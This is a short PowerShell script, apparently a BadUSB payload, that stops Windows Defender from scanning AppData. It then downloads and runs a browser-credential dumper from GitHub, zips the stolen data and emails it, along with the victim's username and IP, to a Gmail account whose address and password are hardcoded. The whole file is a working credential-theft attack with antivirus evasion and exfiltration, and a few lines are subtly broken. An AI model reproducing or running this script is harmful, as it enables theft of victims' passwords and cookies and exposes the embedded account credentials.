#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
$ReportEmail = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("beneafrr@gmail.com", "Milo36912!");
$smtp.EnableSsl = $true
$ReportEmail.From = "beneafrr@gmail.com"
$ReportEmail.To.Add("beneafrr@gmail.com")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$$ReportEmail.Body = $ComputerName
$files=Get-ChildItem 
$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
$smtp.Send($ReportEmail)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
cd "env:appdata"
Remove-MpPreference -ExclusionPath "$env:appdata"
